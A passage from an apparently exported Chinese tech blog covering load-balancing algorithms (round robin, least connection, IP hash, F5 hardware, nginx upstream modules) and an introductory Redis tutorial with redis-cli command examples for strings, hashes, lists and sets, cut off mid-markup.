<h1 id="一、调度算法"><a href="#一、调度算法" class="headerlink" title="一、调度算法"></a>一、调度算法</h1><ul>
<li><p>轮循(Round Robin)<br>这种方法会将收到的请求循环分配到服务器集群中的每台机器，即有效服务器。如果使用这种方式，所有的标记进入虚拟服务的服务器应该有相近的资源容量 以及负载形同的应用程序。如果所有的服务器有相同或者相近的性能那么选择这种方式会使服务器负载形同。基于这个前提，轮循调度是一个简单而有效的分配请求 的方式。然而对于服务器不同的情况，选择这种方式就意味着能力比较弱的服务器也会在下一轮循环中接受轮循，即使这个服务器已经不能再处理当前这个请求了。 这可能导致能力较弱的服务器超载。</p>
</li>
<li><p>加权轮循(Weighted Round Robin)<br>这种算法解决了简单轮循调度算法的缺点：传入的请求按顺序被分配到集群中服务器，但是会考虑提前为每台服务器分配的权重。管理员只是简单的通过服务 器的处理能力来定义各台服务器的权重。例如，能力最强的服务器A给的权重是100，同时能力最低的服务器给的权重是50。这意味着在服务器B接收到第一个 请求之前前，服务器A会连续的接受到2个请求，以此类推。</p>
</li>
<li><p>最少连接数(Least Connection)<br>以上两种方法都没有考虑的是系统不能识别在给定的时间里保持了多少连接。因此可能发生，服务器B服务器收到的连接比服务器A少但是它已经超载，因为 服务器B上的用户打开连接持续的时间更长。这就是说连接数即服务器的负载是累加的。这种潜在的问题可以通过“最少连接数”算法来避免：传入的请求是根据每 台服务器当前所打开的连接数来分配的。即活跃连接数最少的服务器会自动接收下一个传入的请求。接本上和简单轮询的原则相同：所有拥有虚拟服务的服务器资源 容量应该相近。值得注意的是，在流量率低的配置环境中，各服务器的流量并不是相同的，会优先考虑第一台服务器。这是因为，如果所有的服务器是相同的，那么 第一个服务器优先，直到第一台服务器有连续的活跃流量，否则总是会优先选择第一台服务器。</p>
</li>
<li><p>最少连接数慢启动时间(Least Connection Slow Start Time)<br>对最少连接数和带权重的最小连接数调度方法来说，当一个服务器刚加入线上环境是，可以为其配置一个时间段，在这段时间内连接数是有限制的而且是缓慢 增加的。这为服务器提供了一个‘过渡时间’以保证这个服务器不会因为刚启动后因为分配的连接数过多而超载。这个值在L7配置界面设置。</p>
</li>
<li><p>加权最少连接(Weighted Least Connection)<br>如果服务器的资源容量各不相同，那么“加权最少连接”方法更合适：由管理员根据服务器情况定制的权重所决定的活跃连接数一般提供了一种对服务器非常 平衡的利用，因为他它借鉴了最少连接和权重两者的优势。通常，这是一个非常公平的分配方式，因为它使用了连接数和服务器权重比例;集群中比例最低的服务器 自动接收下一个请求。但是请注意，在低流量情况中使用这种方法时，请参考“最小连接数”方法中的注意事项。</p>
</li>
<li><p>基于代理的自适应负载均衡(Agent Based Adaptive Balancing)<br>除了上述方法之外，负载主机包含一个自适用逻辑用来定时监测服务器状态和该服务器的权重。对于非常强大的“基于代理的自适应负载均衡”方法来说，负 载主机以这种方式来定时检测所有服务器负载情况：每台服务器都必须提供一个包含文件，这个文件包含一个0~99的数字用来标明改服务器的实际负载情况 (0=空前，99=超载，101=失败，102=管理员禁用)，而服务器同构http get方法来获取这个文件;同时对集群中服务器来说，以二进制文件形式提供自身负载情况也是该服务器工作之一，然而，并没有限制服务器如何计算自身的负载 情况。根据服务器整体负载情况，有两种策略可以选择：在常规的操作中，调度算法通过收集的服务器负载值和分配给该服务器的连接数的比例计算出一个权重比 例。因此，如果一个服务器负载过大，权重会通过系统透明的作重新调整。和加权轮循调度方法一样，不正确的分配可以被记录下来使得可以有效的为不同服务器分 配不同的权重。然而，在流量非常低的环境下，服务器报上来的负载值将不能建立一个有代表性的样本;那么基于这些值来分配负载的话将导致失控以及指令震荡。 因此，在这种情况下更合理的做法是基于静态的权重比来计算负载分配。当所有服务器的负载低于管理员定义的下限时，负载主机就会自动切换为加权轮循方式来分 配请求;如果负载大于管理员定义的下限，那么负载主机又会切换回自适应方式。</p>
</li>
<li><p>固定权重(Fixed Weighted)<br>最高权重只有在其他服务器的权重值都很低时才使用。然而，如果最高权重的服务器下降，则下一个最高优先级的服务器将为客户端服务。这种方式中每个真实服务器的权重需要基于服务器优先级来配置。</p>
</li>
<li><p>加权响应(Weighted Response)<br>流量的调度是通过加权轮循方式。加权轮循中所使用的权重是根据服务器有效性检测的响应时间来计算。每个有效性检测都会被计时，用来标记它响应成功花 了多长时间。但是需要注意的是，这种方式假定服务器心跳检测是基于机器的快慢，但是这种假设也许不总是能够成立。所有服务器在虚拟服务上的响应时间的总和 加在一起，通过这个值来计算单个服务物理服务器的权重;这个权重值大约每15秒计算一次。</p>
</li>
</ul>
</blockquote>
<p>源IP哈希(Source IP Hash)<br>这种方式通过生成请求源IP的哈希值，并通过这个哈希值来找到正确的真实服务器。这意味着对于同一主机来说他对应的服务器总是相同。使用这种方式，你不需要保存任何源IP。但是需要注意，这种方式可能导致服务器负载不平衡。</p>
<blockquote>
<h1 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h1></blockquote>
<p>目前很多网站或应用在设计之初都会为高并发的数据请求做负载均衡,不差钱的土豪用户一般会直接买F5硬件设备作为其负载均衡器，原因不用多说，其功能强大，不仅包含负载均衡还包括应用交换、会话交换、状态监控、智能网络地址转换、通用持续性、响应错误处理、IPv6网关、高级路由、智能端口镜像、SSL加速、智能HTTP压缩、TCP优化、第7层速率整形、内容缓冲、内容转换、连接加速、高速缓存、Cookie加密、选择性内容加密、应用攻击过滤、拒绝服务(DoS)攻击和SYN Flood保护、防火墙过滤等功能，是不是很强大？当然价格也是让人很“心动”。而一些预算并不高，正在初期发展的网站来说，Nginx这种软负载也能很好的满足其数据分流的需求。</p>
<blockquote>
<h2 id="1-硬件实现-F5"><a href="#1-硬件实现-F5" class="headerlink" title="1. 硬件实现(F5)"></a>1. 硬件实现(F5)</h2><p>以F5具体的产品的功能特点来说明:</p>
</blockquote>
<p><img src="/2018/04/12/distributed/loadbalance/lb_2.png" alt><br><img src="/2018/04/12/distributed/loadbalance/lb_3.png" alt></p>
<blockquote>
<h2 id="2-软件实现-nginx为例"><a href="#2-软件实现-nginx为例" class="headerlink" title="2. 软件实现(nginx为例)"></a>2. 软件实现(nginx为例)</h2><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3></blockquote>
<p>Nginx（程式化为NGINX，NGiИX或nginx的）是一种网络服务器，其也可以被用作反向代理，负载平衡器和HTTP缓存。该软件由Igor Sysoev创建，并于2004年首次公开发布。一家同名公司于2011年成立，以提供支持。<br>Nginx是免费的开放源代码软件，根据类BSD许可条款发布。很大一部分Web服务器使用NGINX,经常作为负载均衡器。</p>
<blockquote>
<ul>
<li><p>人气<br>根据Netcraft的2016年11月网络服务器调查， Nginx被发现是所有“活跃”站点（18.22％的受访站点）和百万最繁忙站点中使用次数最多的Web服务器（27.83％受访网站）。根据W3Techs的数据，前100万个网站中的37.7％，前10万个网站中的49.7％以及前10000个网站中的57.0％使用了它。根据BuiltWith的数据，在10,000个网站中，有38.2％的网站使用了它，并且在10万，10万和1百万的网站中增长。维基百科使用Nginx作为其SSL终止代理。从OpenBSD开始版本5.2（2012年11月1日）中，Nginx成为OpenBSD基础系统的一部分，提供了替代系统的Ap​​ache 1.3的分支，该分支旨在替代它，但后来被OpenBSD自己的httpd.</p>
</li>
<li><p>特点<br>Nginx可以通过使用FastCGI，脚本的SCGI处理程序，WSGI应用程序服务器或Phusion Passenger模块来部署网络上的动态HTTP内容，并且可以充当软件负载平衡器。</p>
</li>
</ul>
</blockquote>
<p>Nginx使用异步 事件驱动的方法来处理请求。Nginx的模块化事件驱动架构可以在高负载下提供更可预测的性能.</p>
<p>HTTP代理和Web服务器功能<br>能够处理超过10,000个具有较低内存占用空间的同时连接（每10k个非活动HTTP保持活动连接约2.5 MB ）<br>处理静态文件，索引文件和自动索引<br>反向代理与缓存<br>通过带内健康检查进行负载平衡<br>TLS / SSL与SNI和OCSP装订支持,通过OpenSSL的。<br>FastCGI，SCGI，uWSGI支持与缓存<br>基于名称和IP地址的虚拟服务器<br>与IPv6兼容<br>WebSockets和HTTP/1.1升级(101交换协议)<br>邮件代理功能<br>TLS / SSL支持<br>STARTTLS支持<br>SMTP,POP3和IMAP 代理<br>使用外部HTTP服务器进行身份验证<br>其他功能包括升级可执行文件和配置,无需客户端连接丢失,以及基于模块的架构，同时支持核心和第三方模块。<br>付费Plus产品还包含其他功能，例如高级负载平衡和访问扩展的性能监控指标套件。</p>
<blockquote>
<ul>
<li>nginx负载均衡策略</li>
</ul>
</blockquote>
<p>ngx_http_upstream_round_robin，加权轮询，可均分请求，是默认的HTTP负载均衡算法，集成在框架中。</p>
<p>ngx_http_upstream_ip_hash_module，IP哈希，可保持会话。</p>
<p>ngx_http_upstream_least_conn_module，最少连接数，可均分连接。</p>
<p>ngx_http_upstream_hash_module，一致性哈希，可减少缓存数据的失效。</p>
<blockquote>
<h3 id="ribbon"><a href="#ribbon" class="headerlink" title="ribbon"></a>ribbon</h3></blockquote>
<p>除nginx提供负载均衡策略外,ribbon 也提供了对应的负载均衡策略.具体参考<a href="https://github.com/Netflix/ribbon" target="_blank" rel="noopener">ribbon github</a>.其他还有HAProxy、LVS等.</p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis入门</title>
    <url>/2017/11/15/distributed/Redis%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。从2015年6月开始，Redis的开发由Redis Labs赞助，而2013年5月至2015年6月期间，其开发由Pivotal赞助。在2013年5月之前，其开发由VMware赞助。根据月度排行网站DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库。</p>
<p>Redis的外围由一个键、值映射的字典构成。与其他非关系型数据库主要不同在于：Redis中值的类型不仅限于字符串，还支持如下抽象数据类型：</p>
<blockquote>
<ul>
<li>字符串列表</li>
<li>无序不重复的字符串集合</li>
<li>有序不重复的字符串集合</li>
<li>键、值都为字符串的哈希表</li>
</ul>
</blockquote>
<p>值的类型决定了值本身支持的操作。Redis支持不同无序、有序的列表，无序、有序的集合间的交集、并集等高级服务器端原子操作。</p>
<blockquote>
<h1 id="一、数据类型和基础命令"><a href="#一、数据类型和基础命令" class="headerlink" title="一、数据类型和基础命令"></a>一、数据类型和基础命令</h1><ul>
<li>1、 String </li>
</ul>
</blockquote>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">#查看所有的key</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; keys *</span><br><span class="line">(empty list or <span class="built_in">set</span>)</span><br><span class="line"></span><br><span class="line">#为a 赋值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">set</span> a "<span class="number">123</span>"</span><br><span class="line">OK</span><br><span class="line">#获取a的值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; get a</span><br><span class="line">"<span class="number">123</span>"</span><br><span class="line"></span><br><span class="line">#再次赋值已经存在的变量,会覆盖原值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">set</span> a "<span class="number">4322</span>"</span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; get a</span><br><span class="line">"<span class="number">4322</span>"</span><br><span class="line">#获取不存在的key,返回nil</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; get b</span><br><span class="line">(nil)</span><br><span class="line">#判断是否存在一个key,<span class="number">0</span>表示不存在</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; exists b</span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; exists a</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#输入不存在的命令,会出错误</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; len a</span><br><span class="line">(error) ERR unknown command 'len'</span><br><span class="line"></span><br><span class="line">#字符串的长度</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; strlen a</span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">set</span> b <span class="number">21</span></span><br><span class="line">OK</span><br><span class="line">#自增key的值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; incr b</span><br><span class="line">(integer) <span class="number">22</span></span><br><span class="line"></span><br><span class="line">#key 加上指定的值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; incrby b <span class="number">2</span></span><br><span class="line">(integer) <span class="number">24</span></span><br><span class="line"></span><br><span class="line">#key 自减</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; decr b</span><br><span class="line">(integer) <span class="number">23</span></span><br><span class="line"></span><br><span class="line">#key 减去指定值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; decrby b <span class="number">2</span></span><br><span class="line">(integer) <span class="number">21</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt;</span><br><span class="line"></span><br><span class="line">#添加指定的浮点值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; incrbyfloat b <span class="number">1</span>.<span class="number">32</span></span><br><span class="line">"<span class="number">22</span>.<span class="number">32</span>"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#获取多个key的值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; mget a b</span><br><span class="line"><span class="number">1</span>) "<span class="number">4322</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">24</span>"</span><br><span class="line"></span><br><span class="line"># key后追加指定的value</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">append</span> a "dfkuaidi"</span><br><span class="line">(integer) <span class="number">12</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; get a</span><br><span class="line">"<span class="number">4322</span>dfkuaidi"</span><br><span class="line"></span><br><span class="line">#getset 返回旧的值,重新赋新值。key不存在返回nil</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; getset a "kuaidi"</span><br><span class="line">"<span class="number">4322</span>dfkuaidi"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; get a</span><br><span class="line">"kuaidi"</span><br><span class="line"></span><br><span class="line">#删除key</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">del</span> a</span><br><span class="line">(integer) <span class="number">1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>2、 Hash</li>
</ul>
</blockquote>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">#获取指定key 的指定field</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hget a f</span><br><span class="line">(nil)</span><br><span class="line"></span><br><span class="line">#hset添加</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hset user id <span class="number">1</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#获取key的field的value</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hget user id</span><br><span class="line">"<span class="number">1</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hset user name "lisi"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hset user age <span class="number">32</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hset user status <span class="number">1</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hget user name</span><br><span class="line">"lisi"</span><br><span class="line"></span><br><span class="line">#获取key所有的field/value</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hgetall user</span><br><span class="line"><span class="number">1</span>) "id"</span><br><span class="line"><span class="number">2</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">3</span>) "name"</span><br><span class="line"><span class="number">4</span>) "lisi"</span><br><span class="line"><span class="number">5</span>) "age"</span><br><span class="line"><span class="number">6</span>) "<span class="number">32</span>"</span><br><span class="line"><span class="number">7</span>) "status"</span><br><span class="line"><span class="number">8</span>) "<span class="number">1</span>"</span><br><span class="line"></span><br><span class="line">#获取key多个field</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hmget user id name</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "lisi"</span><br><span class="line"></span><br><span class="line">#判断key中是否存在指定的field</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hexists user <span class="built_in">fs</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hexists user id</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#获取key的所有field，不包含value</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hkeys user</span><br><span class="line"><span class="number">1</span>) "id"</span><br><span class="line"><span class="number">2</span>) "name"</span><br><span class="line"><span class="number">3</span>) "age"</span><br><span class="line"><span class="number">4</span>) "status"</span><br><span class="line"></span><br><span class="line">#获取所有的value</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hvals user</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "lisi"</span><br><span class="line"><span class="number">3</span>) "<span class="number">32</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">1</span>"</span><br><span class="line"></span><br><span class="line">#删除指定的key</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hdel user age</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; hgetall user</span><br><span class="line"><span class="number">1</span>) "id"</span><br><span class="line"><span class="number">2</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">3</span>) "name"</span><br><span class="line"><span class="number">4</span>) "lisi"</span><br><span class="line"><span class="number">5</span>) "status"</span><br><span class="line"><span class="number">6</span>) "<span class="number">1</span>"</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>3、List</li>
</ul>
</blockquote>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">#lpop 从最左边移除元素,key不存在什么也不做</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lpop users</span><br><span class="line">(nil)</span><br><span class="line">#lpush 从左边入栈,key不存在会创建区别于lpushx</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lpush users "lao wang"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lpush users "lao li"</span><br><span class="line">(integer) <span class="number">2</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lpush users "lao wan"</span><br><span class="line">(integer) <span class="number">3</span></span><br><span class="line">#llen key 获取长度</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; llen users</span><br><span class="line">(integer) <span class="number">3</span></span><br><span class="line">#lindex key index  获取key索引位置为第index个的元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lindex users <span class="number">1</span></span><br><span class="line">"lao li"</span><br><span class="line">#lrange  获取key 起始位置的元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrange users <span class="number">1</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span>) "lao li"</span><br><span class="line"><span class="number">2</span>) "lao wang"</span><br><span class="line">#linsert key BEFORE/AFTER o n,在指定key的o 元素 BEFORE/AFTER 插入元素 n</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; linsert user before "lao li" "diao si"</span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"></span><br><span class="line">#rpush 从右侧入栈</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; rpush users "ai ya"</span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line">#llen key 获取key的元素个数</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; llen users</span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line">#lrange key <span class="built_in">start</span> end ,取出key的 <span class="built_in">start</span> 到end 的索引位置的元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "lao wan"</span><br><span class="line"><span class="number">2</span>) "lao li"</span><br><span class="line"><span class="number">3</span>) "lao wang"</span><br><span class="line"><span class="number">4</span>) "ai ya"</span><br><span class="line"></span><br><span class="line">#lpushx key value ,如果key不存在什么也不做</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lpushx use <span class="number">32</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lpush user <span class="number">32</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "diao si"</span><br><span class="line"><span class="number">2</span>) "lao li"</span><br><span class="line"><span class="number">3</span>) "lao wang"</span><br><span class="line">#lset LSET key index value,将列表 key 下标为 index 的元素的值设置为 value 。当 index #参数超出范围，或对一个空列表( key 不存在)进行 LSET 时，返回一个错误。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lset users <span class="number">0</span> "qiong diao si"</span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "qiong diao si"</span><br><span class="line"><span class="number">2</span>) "lao li"</span><br><span class="line"><span class="number">3</span>) "lao wang"</span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "lao"</span><br><span class="line"><span class="number">2</span>) "lao"</span><br><span class="line"><span class="number">3</span>) "lao"</span><br><span class="line"><span class="number">4</span>) "lao"</span><br><span class="line"><span class="number">5</span>) "qiong diao si"</span><br><span class="line"><span class="number">6</span>) "lao li"</span><br><span class="line"><span class="number">7</span>) "lao wang"</span><br><span class="line">#LREM key count value,根据参数 count 的值，移除列表中与参数 value 相等的元素。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrem users <span class="number">3</span> "lao"</span><br><span class="line">(integer) <span class="number">3</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; lrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "lao"</span><br><span class="line"><span class="number">2</span>) "qiong diao si"</span><br><span class="line"><span class="number">3</span>) "lao li"</span><br><span class="line"><span class="number">4</span>) "lao wang"</span><br><span class="line">#删除key </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">del</span> user</span><br><span class="line">(integer) <span class="number">1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>4、Set</li>
</ul>
</blockquote>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">#sadd 操作为集合类型，错误</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sadd users "<span class="number">1</span>" "<span class="number">2</span>" "<span class="number">3</span>" "<span class="number">4</span>"</span><br><span class="line">(error) WRONGTYPE Operation against a key holding the wrong kind of value</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; <span class="built_in">del</span> users</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line">#sadd 添加多个元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sadd users "<span class="number">1</span>" "<span class="number">2</span>" "<span class="number">3</span>" "<span class="number">4</span>"</span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line">#smembers 查看所有元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">4</span>"</span><br><span class="line">#sadd 重复添加元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sadd user "<span class="number">3</span>"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line">##<span class="built_in">set</span> 不会有重复数据</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">4</span>"</span><br><span class="line">##sismember 判断集合中是否包含指定元素,是返回<span class="number">1</span> 不是返回<span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sismember users "<span class="number">1</span>"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sismember users "<span class="number">13</span>"</span><br><span class="line">(integer) <span class="number">0</span></span><br><span 